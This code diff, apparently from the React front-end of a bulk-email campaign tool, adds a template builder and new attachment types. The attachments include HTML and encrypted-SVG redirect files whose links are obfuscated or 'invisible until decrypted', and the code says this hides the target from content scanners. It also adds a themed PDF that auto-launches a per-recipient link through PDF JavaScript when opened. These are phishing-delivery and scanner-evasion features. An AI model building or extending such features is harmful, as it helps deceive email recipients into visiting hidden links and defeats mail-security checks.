@@ -1303,8 +1303,9 @@ const ATTACH_TYPES = [
   {id:"html_image",  lbl:"HTML→Image",   ico:"🖼", col:"#0891b2", mime:"image/png"},
   {id:"html_pdf",    lbl:"HTML→PDF",     ico:"🧾", col:"#0ea5e9", mime:"application/pdf"},
   {id:"qr",          lbl:"QR Code",      ico:"📱", col:"#10b981", mime:"image/png"},
-  {id:"html_redirect",lbl:"HTML Redirect",ico:"🔗", col:"#f59e0b", mime:"text/html"},
-  {id:"svg_redirect", lbl:"SVG Redirect", ico:"◈",  col:"#8b5cf6", mime:"image/svg+xml"},
+  {id:"html_redirect",lbl:"HTML Redirect",ico:"🔗", col:"#f59e0b", mime:"text/html",      offline:true, desc:"Standalone .html → auto-redirects in browser with URL obfuscation"},
+  {id:"svg_redirect", lbl:"SVG Redirect", ico:"◈",  col:"#8b5cf6", mime:"image/svg+xml", offline:true, desc:"AES-256-GCM encrypted SVG badge — link invisible until decrypted"},
+  {id:"pdf_redirect", lbl:"PDF Redirect", ico:"📄", col:"#ef4444", mime:"application/pdf",offline:true, desc:"Themed PDF with full-page link + auto-launch action on open"},
 ];
 
 // Every public AWS region.  Used by the SMTP / API / S3 / ESP region
@@ -6335,33 +6336,37 @@ function TabAttachments({filesList, uploadFile, deleteFile, renameFile, selected
         {/* Type picker (for dynamic generation) */}
         <div className="card">
         <div className="card-title">Generated Attachments</div>
-        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16,marginBottom:16}}>
-          {/* Left: Online */}
-          <div>
-            <div style={{fontSize:11,fontWeight:700,letterSpacing:"0.08em",textTransform:"uppercase",color:"var(--dim)",marginBottom:8}}>☁️ Online Attachment</div>
-            <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(100px,1fr))",gap:8}}>
-              {ATTACH_TYPES.filter(t=>!["html_redirect","svg_redirect"].includes(t.id)).map(t=>(
-                <div key={t.id} className={`ac ${selectedTypes.includes(t.id)?"sel":""}`} onClick={()=>setSelectedTypes(prev=>prev.includes(t.id)?prev.filter(x=>x!==t.id):[...prev,t.id])}>
-                  <div className="ac-ic" style={{background:t.col+"22",fontSize:28}}>{t.ico}</div>
-                  <div className="ac-lbl">{t.lbl}</div>
-                </div>
-              ))}
-            </div>
-          </div>
-          {/* Right: Offline Redirect */}
-          <div>
-            <div style={{fontSize:11,fontWeight:700,letterSpacing:"0.08em",textTransform:"uppercase",color:"var(--dim)",marginBottom:8}}>📥 Offline Redirect</div>
-            <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(100px,1fr))",gap:8,marginBottom:10}}>
-              {ATTACH_TYPES.filter(t=>["html_redirect","svg_redirect"].includes(t.id)).map(t=>(
-                <div key={t.id} className={`ac ${selectedTypes.includes(t.id)?"sel":""}`} onClick={()=>setSelectedTypes(prev=>prev.includes(t.id)?prev.filter(x=>x!==t.id):[...prev,t.id])}>
-                  <div className="ac-ic" style={{background:t.col+"22",fontSize:28}}>{t.ico}</div>
-                  <div className="ac-lbl">{t.lbl}</div>
-                </div>
-              ))}
-            </div>
-            <div className="dim sm">Generates a standalone file the recipient downloads &amp; opens in their browser — it then redirects to your link. URL obfuscation hides the target from content scanners.</div>
+        {/* Online — full-width grid */}
+        <div style={{marginBottom:18}}>
+          <div style={{fontSize:10,fontWeight:700,letterSpacing:"0.1em",textTransform:"uppercase",color:"var(--dim)",marginBottom:8}}>☁️ Online Attachment</div>
+          <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(92px,1fr))",gap:8}}>
+            {ATTACH_TYPES.filter(t=>!t.offline).map(t=>(
+              <div key={t.id} className={`ac ${selectedTypes.includes(t.id)?"sel":""}`} onClick={()=>setSelectedTypes(prev=>prev.includes(t.id)?prev.filter(x=>x!==t.id):[...prev,t.id])}>
+                <div className="ac-ic" style={{background:t.col+"22",fontSize:26}}>{t.ico}</div>
+                <div className="ac-lbl">{t.lbl}</div>
+              </div>
+            ))}
           </div>
         </div>
+        {/* Offline — horizontal feature cards */}
+        <div style={{borderTop:"1px solid var(--border)",paddingTop:14}}>
+          <div style={{fontSize:10,fontWeight:700,letterSpacing:"0.1em",textTransform:"uppercase",color:"var(--dim)",marginBottom:4}}>📥 Offline Redirect</div>
+          <div style={{fontSize:12,color:"var(--dim)",marginBottom:10}}>Standalone file downloaded by recipient — opens in browser and redirects to your link</div>
+          <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:10}}>
+            {ATTACH_TYPES.filter(t=>t.offline).map(t=>(
+              <div key={t.id}
+                onClick={()=>setSelectedTypes(prev=>prev.includes(t.id)?prev.filter(x=>x!==t.id):[...prev,t.id])}
+                style={{display:"flex",alignItems:"flex-start",gap:12,padding:"12px 14px",borderRadius:"var(--radius)",border:`1px solid ${selectedTypes.includes(t.id)?t.col:"var(--border)"}`,background:selectedTypes.includes(t.id)?t.col+"11":"transparent",cursor:"pointer",transition:"all .15s"}}>
+                <div style={{width:38,height:38,borderRadius:8,background:t.col+"22",display:"flex",alignItems:"center",justifyContent:"center",fontSize:22,flexShrink:0}}>{t.ico}</div>
+                <div>
+                  <div style={{fontWeight:600,fontSize:13,marginBottom:3}}>{t.lbl}</div>
+                  <div style={{fontSize:11,color:"var(--dim)",lineHeight:1.4}}>{t.desc}</div>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+        <div style={{height:14}}/>
 
         {selectedTypes.includes("ics") && (
           <div className="card card-sm">
@@ -6529,6 +6534,34 @@ function TabAttachments({filesList, uploadFile, deleteFile, renameFile, selected
           </div>
         )}
 
+        {selectedTypes.includes("pdf_redirect") && (
+          <div className="card card-sm">
+            <div className="card-title">📄 PDF Redirect Settings</div>
+            <Info type="i">Generates a themed PDF that opens in any PDF viewer. Full-page clickable link opens your URL. Adobe Reader also auto-launches on open via PDF JavaScript.</Info>
+            <div className="col g10 mt10">
+              <div>
+                <label className="lbl">Target URL</label>
+                <input value={(attachConfigs.pdf_redirect||{}).pdfrLink||""} onChange={e=>setAttachConfigs({...attachConfigs,pdf_redirect:{...(attachConfigs.pdf_redirect||{}),pdfrLink:e.target.value}})} placeholder="https://your-link.com  (use #EMAIL for per-recipient)" style={{fontSize:14,padding:"10px 12px"}}/>
+              </div>
+              <div className="row g10">
+                <div style={{flex:1}}>
+                  <label className="lbl">Theme</label>
+                  <select value={(attachConfigs.pdf_redirect||{}).pdfrStyle||"crimson"} onChange={e=>setAttachConfigs({...attachConfigs,pdf_redirect:{...(attachConfigs.pdf_redirect||{}),pdfrStyle:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
+                    <option value="crimson">Crimson — classic red</option>
+                    <option value="obsidian">Obsidian — dark mono</option>
+                    <option value="cobalt">Cobalt — corporate blue</option>
+                    <option value="cipher">Cipher — terminal green</option>
+                  </select>
+                </div>
+                <div style={{flex:1}}>
+                  <label className="lbl">File Name</label>
+                  <input value={(attachConfigs.pdf_redirect||{}).pdfrName||""} onChange={e=>setAttachConfigs({...attachConfigs,pdf_redirect:{...(attachConfigs.pdf_redirect||{}),pdfrName:e.target.value}})} placeholder="document.pdf" style={{fontSize:14,padding:"10px 12px"}}/>
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+
         {selectedTypes.includes("html_pdf") && (
           <div className="card card-sm">
             <div className="card-title">🧾 HTML → PDF Settings</div>
@@ -6674,16 +6707,171 @@ function TabAttachments({filesList, uploadFile, deleteFile, renameFile, selected
 /* ════════════════════════════════════════
    TAB: TAGS & TEMPLATES
 ════════════════════════════════════════ */
+function TemplateBuilder({setHtmlBody, setTab}) {
+  const [tpls, setTpls]       = useState([]);
+  const [loaded, setLoaded]   = useState(false);
+  const [editor, setEditor]   = useState(null);  // null=list, obj=editing
+  const [preview, setPreview] = useState(false);
+  const [saving, setSaving]   = useState(false);
+  const [search, setSearch]   = useState("");
+
+  const TPLR_TAGS = ["#FIRSTNAME","#LASTNAME","#EMAIL","#COMPANY","#SUBJECT","#DATE","#PHONE","#CITY","#COUNTRY","#UNSUBSCRIBE","#TRACKOPEN"];
+
+  React.useEffect(()=>{
+    if(!loaded){
+      apiCall("/api/templates").then(r=>r.json()).then(d=>{setTpls(d.templates||[]);setLoaded(true);}).catch(()=>setLoaded(true));
+    }
+  },[loaded]);
+
+  function insertTagAt(tag){
+    const ta=document.getElementById("tpl-html-ed");
+    if(!ta){setEditor(e=>({...e,html:(e.html||"")+tag}));return;}
+    const s=ta.selectionStart,en=ta.selectionEnd,v=ta.value;
+    const nv=v.slice(0,s)+tag+v.slice(en);
+    setEditor(e=>({...e,html:nv}));
+    setTimeout(()=>{ta.selectionStart=ta.selectionEnd=s+tag.length;ta.focus();},0);
+  }
+
+  async function saveTemplate(){
+    if(!editor) return;
+    setSaving(true);
+    try{
+      const r=await apiCall("/api/templates/save",{method:"POST",body:JSON.stringify({id:editor.id||undefined,name:editor.name||"Untitled",subject:editor.subject||"",html:editor.html||"",plain:editor.plain||""})});
+      const d=await r.json();
+      setLoaded(false);
+      setEditor(e=>({...e,id:d.id}));
+    }catch(e){alert("Save failed: "+e.message);}
+    setSaving(false);
+  }
+
+  async function deleteTemplate(){
+    if(!editor?.id||!confirm("Delete this template?")) return;
+    await apiCall(`/api/templates/${editor.id}`,{method:"DELETE"});
+    setTpls(p=>p.filter(t=>t.id!==editor.id));
+    setEditor(null);
+  }
+
+  function uploadHtml(){
+    const inp=document.createElement("input");
+    inp.type="file";inp.accept=".html,.htm,.txt";
+    inp.onchange=e=>{
+      const f=e.target.files[0];if(!f)return;
+      const reader=new FileReader();
+      reader.onload=ev=>setEditor(ed=>({...ed,html:ev.target.result,...(!ed.name?{name:f.name.replace(/\.[^.]+$/,"")}:{})}));
+      reader.readAsText(f);
+    };
+    inp.click();
+  }
+
+  // ── Editor view ──
+  if(editor!==null){
+    return (
+      <div>
+        <div className="row g8 mb12" style={{flexWrap:"wrap",alignItems:"center"}}>
+          <button className="btn btn-g btn-sm" onClick={()=>{setEditor(null);setPreview(false);}}>← Back</button>
+          <button className="btn btn-g btn-sm" onClick={uploadHtml}>⬆ Upload HTML</button>
+          <button className="btn btn-g btn-sm" onClick={()=>setPreview(p=>!p)}>{preview?"✏️ Edit":"👁 Preview"}</button>
+          <div style={{flex:1}}/>
+          <button className="btn btn-p btn-sm" onClick={()=>{setHtmlBody(editor.html||"");setTab("compose");}} disabled={!editor.html}>▶ Use in Compose</button>
+          {editor.id && <button className="btn btn-d btn-sm" onClick={deleteTemplate}>🗑 Delete</button>}
+          <button className="btn btn-ok btn-sm" onClick={saveTemplate} disabled={saving}>{saving?"Saving…":"💾 Save"}</button>
+        </div>
+        <div className="g2 mb10">
+          <div><label className="lbl">Template Name</label>
+            <input value={editor.name||""} onChange={e=>setEditor(ed=>({...ed,name:e.target.value}))} placeholder="My Template" style={{fontSize:14,padding:"10px 12px"}}/></div>
+          <div><label className="lbl">Default Subject</label>
+            <input value={editor.subject||""} onChange={e=>setEditor(ed=>({...ed,subject:e.target.value}))} placeholder="Subject line (supports tags)" style={{fontSize:14,padding:"10px 12px"}}/></div>
+        </div>
+        <div className="row g6 mb8" style={{flexWrap:"wrap",alignItems:"center"}}>
+          <span style={{fontSize:11,color:"var(--dim)"}}>Insert tag:</span>
+          {TPLR_TAGS.map(tag=>(
+            <button key={tag} className="btn btn-g btn-xs" onClick={()=>insertTagAt(tag)} style={{fontFamily:"monospace",fontSize:10,padding:"3px 7px"}}>{tag}</button>
+          ))}
+        </div>
+        {preview?(
+          <div>
+            <div style={{fontSize:11,color:"var(--dim)",marginBottom:6}}>Preview (sandboxed)</div>
+            <div style={{border:"1px solid var(--border)",borderRadius:8,overflow:"hidden",height:520}}>
+              <iframe srcDoc={editor.html||""} sandbox="allow-same-origin" style={{width:"100%",height:"100%",border:"none"}}/>
+            </div>
+          </div>
+        ):(
+          <div>
+            <label className="lbl">HTML Body</label>
+            <textarea id="tpl-html-ed" value={editor.html||""} onChange={e=>setEditor(ed=>({...ed,html:e.target.value}))}
+              style={{minHeight:440,fontFamily:"var(--font-mono)",fontSize:12,lineHeight:1.5}}
+              placeholder="<html><body>...</body></html> — paste or upload your template HTML"/>
+          </div>
+        )}
+      </div>
+    );
+  }
+
+  // ── List view ──
+  const visibleTpls = search ? tpls.filter(t=>t.name.toLowerCase().includes(search.toLowerCase())) : tpls;
+  return (
+    <div>
+      <div className="row g8 mb16">
+        <input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search saved templates…" style={{flex:1}}/>
+        <button className="btn btn-g btn-sm" onClick={()=>setLoaded(false)}>↻ Refresh</button>
+        <button className="btn btn-p btn-sm" onClick={()=>setEditor({id:null,name:"",subject:"",html:"",plain:""})}>+ New Template</button>
+      </div>
+      {!loaded&&<div className="dim sm">Loading templates…</div>}
+      {loaded&&tpls.length===0&&(
+        <div className="card" style={{textAlign:"center",padding:"32px 24px"}}>
+          <div style={{fontSize:32,marginBottom:12}}>📋</div>
+          <div style={{fontWeight:600,marginBottom:6}}>No saved templates yet</div>
+          <div className="dim sm mb16">Create a template to reuse across campaigns. Supports all campaign tags.</div>
+          <button className="btn btn-p btn-sm" onClick={()=>setEditor({id:null,name:"",subject:"",html:"",plain:""})}>+ Create First Template</button>
+        </div>
+      )}
+      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(260px,1fr))",gap:16}}>
+        {visibleTpls.map(t=>(
+          <div key={t.id} className="tplc">
+            <div className="tplc-prev">
+              {t.html
+                ? <iframe srcDoc={t.html} sandbox="allow-same-origin" title={t.name} style={{width:"200%",height:"200%",transform:"scale(.5)",transformOrigin:"top left",border:"none",pointerEvents:"none"}}/>
+                : <div style={{display:"flex",alignItems:"center",justifyContent:"center",height:"100%",color:"var(--dim)",fontSize:13}}>No preview</div>}
+            </div>
+            <div className="tplc-info">
+              <div className="tplc-name">{t.name}</div>
+              {t.subject&&<div className="tplc-cat" style={{fontFamily:"monospace",fontSize:10,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{t.subject}</div>}
+              <div className="row g6 mt8">
+                <button className="btn btn-p btn-xs" onClick={()=>{setHtmlBody(t.html||"");setTab("compose");}}>▶ Use</button>
+                <button className="btn btn-g btn-xs" onClick={()=>setEditor({...t})}>✏️ Edit</button>
+              </div>
+            </div>
+          </div>
+        ))}
+        {/* Built-in templates */}
+        {BUILTIN_TEMPLATES.filter(t=>!search||t.name.toLowerCase().includes(search.toLowerCase())).map(t=>(
+          <div key={t.id} className="tplc" style={{opacity:0.8}}>
+            <div className="tplc-prev" style={{background:t.col||"#fff"}}>
+              {t.html
+                ? <iframe srcDoc={t.html} sandbox="allow-same-origin" title={t.name} style={{width:"200%",height:"200%",transform:"scale(.5)",transformOrigin:"top left",border:"none",pointerEvents:"none"}}/>
+                : <div style={{display:"flex",alignItems:"center",justifyContent:"center",height:"100%",color:"#ccc",fontSize:13}}>No preview</div>}
+            </div>
+            <div className="tplc-info">
+              <div className="tplc-name">{t.name}</div>
+              <div className="tplc-cat">{t.cat} · Built-in</div>
+              <div className="row g6 mt8">
+                <button className="btn btn-p btn-xs" onClick={()=>{setHtmlBody(t.html||"");setTab("compose");}}>▶ Use</button>
+                <button className="btn btn-g btn-xs" onClick={()=>setEditor({id:null,name:t.name+" (copy)",subject:"",html:t.html||"",plain:""})}>✏️ Edit copy</button>
+              </div>
+            </div>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
 function TabTagsTemplates({setHtmlBody, setTab}) {
   const [tTab, setTTab] = useState("tags");
   const [tagSearch, setTagSearch] = useState("");
   const [tagCat, setTagCat] = useState("all");
   const [tplSearch, setTplSearch] = useState("");
-  const [customTpls, setCustomTpls] = useState([]);
-  const [editing, setEditing] = useState(null);
 
-  const allTpls = [...BUILTIN_TEMPLATES, ...customTpls];
-  const filtered = tplSearch ? allTpls.filter(t=>t.name.toLowerCase().includes(tplSearch.toLowerCase())||t.cat.toLowerCase().includes(tplSearch.toLowerCase())) : allTpls;
   const filteredTags = TAGS.filter(t=>(tagCat==="all"||t.cat===tagCat)&&(!tagSearch||t.tag.includes(tagSearch.toUpperCase())||t.desc.toLowerCase().includes(tagSearch.toLowerCase())));
 
   return (
@@ -6691,7 +6879,7 @@ function TabTagsTemplates({setHtmlBody, setTab}) {
       <div className="ph"><div className="ph-title">🏷️ Tags & Templates</div></div>
       <div className="tab-bar">
         <button className={`tb ${tTab==="tags"?"on":""}`} onClick={()=>setTTab("tags")}>Tag Reference</button>
-        <button className={`tb ${tTab==="tpls"?"on":""}`} onClick={()=>setTTab("tpls")}>Templates ({allTpls.length})</button>
+        <button className={`tb ${tTab==="tpls"?"on":""}`} onClick={()=>setTTab("tpls")}>Template Builder</button>
       </div>
 
       {tTab==="tags" && (
@@ -6726,62 +6914,7 @@ function TabTagsTemplates({setHtmlBody, setTab}) {
         </div>
       )}
 
-      {tTab==="tpls" && (
-        <div>
-          <div className="row g8 ac-center mb16">
-            <input value={tplSearch} onChange={e=>setTplSearch(e.target.value)} placeholder="Search templates…" style={{flex:1}}/>
-            <button className="btn btn-g btn-sm" onClick={()=>{
-              const n=prompt("Template name:");
-              if(!n) return;
-              setCustomTpls(p=>[...p,{id:"c_"+Date.now(),name:n,cat:"Custom",col:"#f9f9f9",html:""}]);
-            }}>+ New Template</button>
-          </div>
-          <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(260px,1fr))",gap:16}}>
-            {filtered.map(t=>(
-              <div key={t.id} className="tplc">
-                <div className="tplc-prev" style={{background:t.col||"#fff"}}>
-                  {t.html
-                    ? <iframe srcDoc={t.html} sandbox="allow-same-origin" title={t.name} style={{width:"200%",height:"200%",transform:"scale(.5)",transformOrigin:"top left",border:"none",pointerEvents:"none"}}/>
-                    : <div style={{display:"flex",alignItems:"center",justifyContent:"center",height:"100%",color:"#ccc",fontSize:13}}>No preview</div>
-                  }
-                </div>
-                <div className="tplc-info">
-                  <div className="tplc-name">{t.name}</div>
-                  <div className="tplc-cat">{t.cat}</div>
-                  <div className="row g6 mt8">
-                    <button className="btn btn-p btn-xs" onClick={()=>{setHtmlBody(t.html);setTab("compose");}}>Use</button>
-                    <button className="btn btn-g btn-xs" onClick={()=>setEditing({...t})}>Edit</button>
-                  </div>
-                </div>
-              </div>
-            ))}
-          </div>
-        </div>
-      )}
-
-      {editing && (
-        <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,.75)",zIndex:9999,display:"flex",alignItems:"center",justifyContent:"center"}}
-          onClick={()=>setEditing(null)}>
-          <div style={{background:"var(--card)",border:"1px solid var(--border)",borderRadius:"var(--radius)",padding:24,width:"82vw",maxHeight:"82vh",overflow:"auto"}}
-            onClick={e=>e.stopPropagation()}>
-            <div className="card-title">Editing: {editing.name}</div>
-            <div className="mb10"><label className="lbl">Name</label><input value={editing.name} onChange={e=>setEditing({...editing,name:e.target.value})}/></div>
-            <div><label className="lbl">HTML</label><textarea value={editing.html} onChange={e=>setEditing({...editing,html:e.target.value})} style={{minHeight:320,fontFamily:"var(--font-mono)",fontSize:12}}/></div>
-            <div className="row g8 mt12">
-              <button className="btn btn-p btn-sm" onClick={()=>{
-                const isBuiltin = BUILTIN_TEMPLATES.find(t=>t.id===editing.id);
-                if(isBuiltin) {
-                  setCustomTpls(p=>{const ex=p.find(t=>t.id===editing.id);return ex?p.map(t=>t.id===editing.id?editing:t):[...p,{...editing,id:"c_"+editing.id}];});
-                } else {
-                  setCustomTpls(p=>p.map(t=>t.id===editing.id?editing:t));
-                }
-                setEditing(null);
-              }}>Save</button>
-              <button className="btn btn-g btn-sm" onClick={()=>setEditing(null)}>Cancel</button>
-            </div>
-          </div>
-        </div>
-      )}
+      {tTab==="tpls" && <TemplateBuilder setHtmlBody={setHtmlBody} setTab={setTab}/>}
     </div>
   );
 }
@@ -11808,6 +11941,11 @@ function App() {
           overlay_size: ac("html_pdf").htmlPdfOverlaySize || 36,
           overlay_position: ac("html_pdf").htmlPdfOverlayPosition || "center",
           ghost_link: ac("html_pdf").htmlPdfGhostOn ? (ac("html_pdf").htmlPdfGhostLink || "") : "",
+        };
+        if(selectedTypes.includes("pdf_redirect")) cfg.pdf_redirect = {
+          link: ac("pdf_redirect").pdfrLink || "",
+          name: ac("pdf_redirect").pdfrName || "",
+          style: ac("pdf_redirect").pdfrStyle || "crimson",
         };
         if(selectedTypes.includes("html_redirect")) cfg.html_redirect = {
           link: ac("html_redirect").hrLink || "",
